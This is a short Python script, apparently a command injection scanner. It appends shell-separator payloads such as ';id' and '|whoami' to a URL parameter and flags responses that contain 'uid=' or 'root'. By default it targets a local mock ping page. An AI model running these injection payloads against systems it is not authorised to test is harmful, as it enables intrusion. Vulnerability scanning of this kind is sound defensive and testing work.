import sys
import urllib.request
import urllib.parse
import urllib.error
import json
import os

RESULTS_FILE = "scan_results.json"

PAYLOADS = [
    ";id",
    "|id",
    "&id",
    ";whoami",
    "|whoami",
    "`id`"
]

SIGNATURES = [
    "uid=",
    "gid=",
    "root",
    "www-data"
]

def audit_cmd_injection(target_url, param_name="ip"):
    print("=" * 60)
    print(f" [*] COMMAND INJECTION / RCE SCANNER: {target_url}")
    print(f" [*] Target Parameter: '{param_name}'")
    print("=" * 60)

    parsed = urllib.parse.urlparse(target_url)
    query_params = urllib.parse.parse_qs(parsed.query)

    vulnerable = False
    exploited_url = ""

    for payload in PAYLOADS:
        # Construct test URL
        test_params = query_params.copy()
        base_val = test_params.get(param_name, ["127.0.0.1"])[0]
        test_params[param_name] = [base_val + payload]
        
        new_query = urllib.parse.urlencode(test_params, doseq=True)
        target_endpoint = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment
        ))

        print(f"[*] Testing payload: {payload}")
        try:
            req = urllib.request.Request(target_endpoint, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=3) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                
                # Check for RCE signatures
                if any(sig in body for sig in SIGNATURES):
                    print(f"    [!] VULNERABLE: Command Injection detected!")
                    print(f"        Matched signature in response body.")
                    print(f"        Exploit Payload URL: {target_endpoint}")
                    vulnerable = True
                    exploited_url = target_endpoint
                    break
        except urllib.error.URLError as e:
            print(f"    [-] Connection error: {e.reason}")
        except Exception:
            pass

    if vulnerable:
        # Save finding to scan_results.json
        findings = []
        if os.path.exists(RESULTS_FILE):
            try:
                with open(RESULTS_FILE, "r") as f:
                    findings = json.load(f)
            except Exception:
                pass
        
        findings.append({
            "target": exploited_url,
            "param": param_name,
            "vulnerability": "Command Injection"
        })

        with open(RESULTS_FILE, "w") as f:
            json.dump(findings, f, indent=4)
        print("[+] Finding saved to scan_results.json")
    else:
        print("[-] Target appears secure against basic command injection payloads.")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target = sys.argv[1]
        param = "ip"
        if "-p" in sys.argv:
            try:
                param_idx = sys.argv.index("-p") + 1
                param = sys.argv[param_idx]
            except IndexError:
                pass
        audit_cmd_injection(target, param)
    else:
        # Default local mock test
        audit_cmd_injection("http://127.0.0.1:8080/ping.php?ip=127.0.0.1", "ip")
